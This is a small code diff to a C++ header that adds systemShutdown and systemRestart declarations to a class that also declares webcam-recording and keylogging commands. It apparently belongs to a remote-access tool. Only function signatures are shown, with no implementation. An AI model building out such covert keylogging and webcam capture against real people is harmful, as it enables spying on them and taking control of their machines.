@@ -23,6 +23,9 @@ public:
     static json startWebcamRecord(const json &);
     static json stopWebcamRecord(const json &);  
 
+    static json systemShutdown(const json &); 
+    static json systemRestart(const json &);
+
     static json startKeylog(const json &);
     static json stopKeylog(const json &);
 
